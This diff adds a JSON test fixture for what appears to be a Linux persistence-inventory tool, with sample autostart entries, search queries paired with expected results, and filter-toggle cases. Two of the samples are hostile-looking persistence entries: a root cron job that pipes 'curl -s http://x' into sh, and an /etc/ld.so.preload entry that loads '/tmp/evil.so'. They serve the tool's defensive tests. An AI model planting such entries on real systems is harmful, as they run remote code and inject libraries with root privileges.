@@ -1,0 +1,386 @@
+{
+ "entries": [
+  {
+   "id": "aa11",
+   "kind": "cron",
+   "name": "backup",
+   "source": "/etc/cron.d/backup",
+   "command": "/usr/bin/curl -s http://x | sh",
+   "target": null,
+   "enabled": "enabled",
+   "trigger": "schedule",
+   "user": "root",
+   "pkg": "",
+   "version": "",
+   "prov": [
+    "unpackaged"
+   ],
+   "flags": [
+    "unpackaged"
+   ],
+   "notes": {},
+   "collector": "cron"
+  },
+  {
+   "id": "bb22",
+   "kind": "systemd_unit",
+   "name": "sshd.service",
+   "source": "/usr/lib/systemd/system/sshd.service",
+   "command": "/usr/sbin/sshd -D",
+   "target": "/usr/sbin/sshd",
+   "enabled": "enabled",
+   "trigger": "boot",
+   "user": null,
+   "pkg": "openssh",
+   "version": "9.6",
+   "prov": [
+    "packaged",
+    "intact"
+   ],
+   "flags": [],
+   "notes": {
+    "unit_type": "service"
+   },
+   "collector": "systemd"
+  },
+  {
+   "id": "cc33",
+   "kind": "ld_preload",
+   "name": "/tmp/evil.so",
+   "source": "/etc/ld.so.preload",
+   "command": "LD_PRELOAD=/tmp/evil.so",
+   "target": "/tmp/evil.so",
+   "enabled": "enabled",
+   "trigger": "always",
+   "user": "root",
+   "pkg": "",
+   "version": "",
+   "prov": [
+    "unpackaged"
+   ],
+   "flags": [
+    "unpackaged",
+    "target-missing"
+   ],
+   "notes": {
+    "env.LD_PRELOAD": "/tmp/evil.so"
+   },
+   "collector": "shell"
+  },
+  {
+   "id": "dd44",
+   "kind": "udev",
+   "name": "99-local.rules",
+   "source": "/etc/udev/rules.d/99-local.rules",
+   "command": "RUN+=\"/bin/true\"",
+   "target": null,
+   "enabled": "disabled",
+   "trigger": "device-event",
+   "user": null,
+   "pkg": "",
+   "version": "",
+   "prov": [
+    "unknown"
+   ],
+   "flags": [],
+   "notes": {},
+   "collector": "kernel"
+  },
+  {
+   "id": "ee55",
+   "kind": "pkg_hook",
+   "name": "pacman:10-a.hook",
+   "source": "/usr/share/libalpm/hooks/10-a.hook",
+   "command": "/usr/bin/ldconfig",
+   "target": null,
+   "enabled": "enabled",
+   "trigger": "package-op",
+   "user": "root",
+   "pkg": "glibc",
+   "version": "2.40",
+   "prov": [
+    "packaged",
+    "modified"
+   ],
+   "flags": [
+    "packaged-modified"
+   ],
+   "notes": {
+    "manager": "pacman"
+   },
+   "collector": "pkg"
+  }
+ ],
+ "cases": [
+  {
+   "q": "",
+   "hits": [
+    "backup",
+    "sshd.service",
+    "/tmp/evil.so",
+    "99-local.rules",
+    "pacman:10-a.hook"
+   ]
+  },
+  {
+   "q": "CURL",
+   "hits": [
+    "backup"
+   ]
+  },
+  {
+   "q": "kind:cron",
+   "hits": [
+    "backup"
+   ]
+  },
+  {
+   "q": "kind:cron|udev",
+   "hits": [
+    "backup",
+    "99-local.rules"
+   ]
+  },
+  {
+   "q": "kind:systemd",
+   "hits": [
+    "sshd.service"
+   ]
+  },
+  {
+   "q": "-kind:cron",
+   "hits": [
+    "sshd.service",
+    "/tmp/evil.so",
+    "99-local.rules",
+    "pacman:10-a.hook"
+   ]
+  },
+  {
+   "q": "flag:unpackaged",
+   "hits": [
+    "backup",
+    "/tmp/evil.so"
+   ]
+  },
+  {
+   "q": "flag:target",
+   "hits": [
+    "/tmp/evil.so"
+   ]
+  },
+  {
+   "q": "flag:none",
+   "hits": [
+    "sshd.service",
+    "99-local.rules"
+   ]
+  },
+  {
+   "q": "-flag:none",
+   "hits": [
+    "backup",
+    "/tmp/evil.so",
+    "pacman:10-a.hook"
+   ]
+  },
+  {
+   "q": "flag:unpackaged prov:unpackaged kind:ld",
+   "hits": [
+    "/tmp/evil.so"
+   ]
+  },
+  {
+   "q": "prov:intact",
+   "hits": [
+    "sshd.service"
+   ]
+  },
+  {
+   "q": "prov:modified",
+   "hits": [
+    "pacman:10-a.hook"
+   ]
+  },
+  {
+   "q": "prov:packaged",
+   "hits": [
+    "sshd.service",
+    "pacman:10-a.hook"
+   ]
+  },
+  {
+   "q": "prov:unknown",
+   "hits": [
+    "99-local.rules"
+   ]
+  },
+  {
+   "q": "pkg:openssh",
+   "hits": [
+    "sshd.service"
+   ]
+  },
+  {
+   "q": "pkg:GLIBC",
+   "hits": [
+    "pacman:10-a.hook"
+   ]
+  },
+  {
+   "q": "enabled:dis",
+   "hits": [
+    "99-local.rules"
+   ]
+  },
+  {
+   "q": "trigger:boot",
+   "hits": [
+    "sshd.service"
+   ]
+  },
+  {
+   "q": "user:root",
+   "hits": [
+    "backup",
+    "/tmp/evil.so",
+    "pacman:10-a.hook"
+   ]
+  },
+  {
+   "q": "collector:shell",
+   "hits": [
+    "/tmp/evil.so"
+   ]
+  },
+  {
+   "q": "src:/etc/ld.so",
+   "hits": [
+    "/tmp/evil.so"
+   ]
+  },
+  {
+   "q": "name:hook",
+   "hits": [
+    "pacman:10-a.hook"
+   ]
+  },
+  {
+   "q": "cmd:\"curl -s\"",
+   "hits": [
+    "backup"
+   ]
+  },
+  {
+   "q": "cmd:sshd",
+   "hits": [
+    "sshd.service"
+   ]
+  },
+  {
+   "q": "id:cc",
+   "hits": [
+    "/tmp/evil.so"
+   ]
+  },
+  {
+   "q": "id:c3",
+   "hits": []
+  },
+  {
+   "q": "note:env.ld_preload=/tmp",
+   "hits": [
+    "/tmp/evil.so"
+   ]
+  },
+  {
+   "q": "note:manager=pacman",
+   "hits": [
+    "pacman:10-a.hook"
+   ]
+  },
+  {
+   "q": "LD_PRELOAD",
+   "hits": [
+    "/tmp/evil.so"
+   ]
+  },
+  {
+   "q": "service",
+   "hits": [
+    "sshd.service"
+   ]
+  },
+  {
+   "q": "http://x",
+   "hits": [
+    "backup"
+   ]
+  },
+  {
+   "q": "sshd -kind:systemd",
+   "hits": []
+  },
+  {
+   "q": "kind:cron kind:udev",
+   "hits": []
+  },
+  {
+   "q": "\"curl -s\"",
+   "hits": [
+    "backup"
+   ]
+  },
+  {
+   "q": "-",
+   "hits": [
+    "backup",
+    "sshd.service",
+    "99-local.rules",
+    "pacman:10-a.hook"
+   ]
+  },
+  {
+   "q": "kind:",
+   "hits": [
+    "backup",
+    "sshd.service",
+    "/tmp/evil.so",
+    "99-local.rules",
+    "pacman:10-a.hook"
+   ]
+  }
+ ],
+ "toggles": [
+  {
+   "query": "",
+   "field": "kind",
+   "value": "cron",
+   "result": "kind:cron"
+  },
+  {
+   "query": "kind:cron",
+   "field": "kind",
+   "value": "udev",
+   "result": "kind:cron|udev"
+  },
+  {
+   "query": "kind:cron|udev",
+   "field": "kind",
+   "value": "cron",
+   "result": "kind:udev"
+  },
+  {
+   "query": "kind:udev curl",
+   "field": "kind",
+   "value": "udev",
+   "result": "curl"
+  },
+  {
+   "query": "curl",
+   "field": "flag",
+   "value": "x",
+   "result": "curl flag:x"
+  }
+ ]
+}
